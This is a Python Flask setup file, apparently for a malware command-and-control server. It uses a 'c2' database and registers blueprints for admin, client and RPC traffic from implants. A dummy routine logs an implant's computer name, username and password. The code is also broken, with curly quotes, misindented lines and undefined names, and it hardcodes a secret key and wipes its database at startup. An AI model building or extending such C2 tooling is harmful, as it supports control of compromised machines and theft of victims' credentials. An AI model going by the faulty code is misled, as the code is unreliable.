

from flask import Flask

from cvnt.database import db

from cvnt.blueprint_admin import admin
from cvnt.blueprint_basic import basic
from cvnt.blueprint_client import client
from cvnt.blueprint_rpc import rpc
from cvnt.blueprint_explorer import explorer
from flask_bootstrap import Bootstrap

import secrets

from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired, Length

SECRET_KEY = 'tO$&!|0wkamvVia0?n$NqIRVWOG'

def build_app():
    app = Flask(__name__)
    
    app.secret_key = SECRET_KEY

    print ('helo lakjlskdfjlakjfsdl')
    bootstrap = Bootstrap(app)

    csrf = CSRFProtect(app)

    app.config.from_mapping(
            SQLALCHEMY_DATABASE_URI="postgresql://baddie:pass@localhost:5432/c2"
    )
    app.config.from_mapping(SQLALCHEMY_ECHO = True)

    app.register_blueprint(basic)
    app.register_blueprint(client)
    app.register_blueprint(admin)
    app.register_blueprint(rpc)
#    app.register_blueprint(explorer)
    csrf.exempt(rpc)

    db.init_app(app)
    with app.app_context():
        db.drop_all()
        db.create_all()
        db.session.commit()
        print('DATABASE INITIALIZED')
    Make_dummy_task()

    return app

def Make_dummy_task():

    register = RegisterImplant()
    register.ImplantID = “Blah Blah”
    register.ComputerName = “Ya Ya”
    register.Username = “username”
    register.Password = “password”

    Ip = “123.0.4.5”
        print(f'[+] New Implant: from {ip}’)
        print(f'[+]    * ImplantID: {register.ImplantID}')
        print(f'[+]    * ComputerName: {register.ComputerName}')
        print(f'[+]    * Username: {register.Username}')
        print(f'[+]    * Password: {register.Password}')

    r = register_implant(make_implant(register, ip))